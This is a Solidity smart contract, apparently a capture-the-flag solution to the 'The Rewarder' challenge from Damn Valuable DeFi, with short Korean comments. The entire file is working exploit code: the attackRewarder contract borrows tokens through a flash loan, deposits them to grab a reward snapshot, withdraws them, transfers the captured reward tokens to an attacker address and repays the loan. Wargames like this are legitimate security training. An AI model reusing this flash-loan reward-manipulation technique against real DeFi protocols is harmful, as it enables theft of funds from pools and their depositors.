// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "../the-rewarder/RewardToken.sol";
import "../DamnValuableToken.sol";
import "../the-rewarder/AccountingToken.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface ITheRewarderPool{
    function deposit(uint256 amountToDeposit) external ;
    function withdraw(uint256 amountToWithdraw) external;
}
interface IFlashLoanPool{
     function flashLoan(uint256 amount) external ;
}

contract attackRewarder{
    address RewardPool;
    address attacker;
    IFlashLoanPool FlashLoanPool;
    DamnValuableToken public immutable liquidityToken;
    AccountingToken public accToken;
    RewardToken public immutable rewardToken;
    
    constructor(address _RewarderPool,address _LoanPool, address _DVT ,address _acT,address _reT,address _attacker){
        RewardPool = _RewarderPool;
        FlashLoanPool = IFlashLoanPool(_LoanPool);
        liquidityToken = DamnValuableToken(_DVT);
        accToken = AccountingToken(_acT);
        rewardToken = RewardToken(_reT);
        attacker=_attacker;
    }
    function solve(uint256 amount)public { // 대출받기
        FlashLoanPool.flashLoan(amount);
    }
    function receiveFlashLoan(uint256 amount) public {// 대출받고나면 실행될 함수
        ITheRewarderPool target=ITheRewarderPool(RewardPool);
        liquidityToken.approve(RewardPool,liquidityToken.balanceOf(address(this)));
        target.deposit(liquidityToken.balanceOf(address(this)));
        target.withdraw(accToken.balanceOf(address(this)));
        rewardToken.transfer(attacker,rewardToken.balanceOf(address(this)));
        liquidityToken.transfer(msg.sender,amount);
    }

}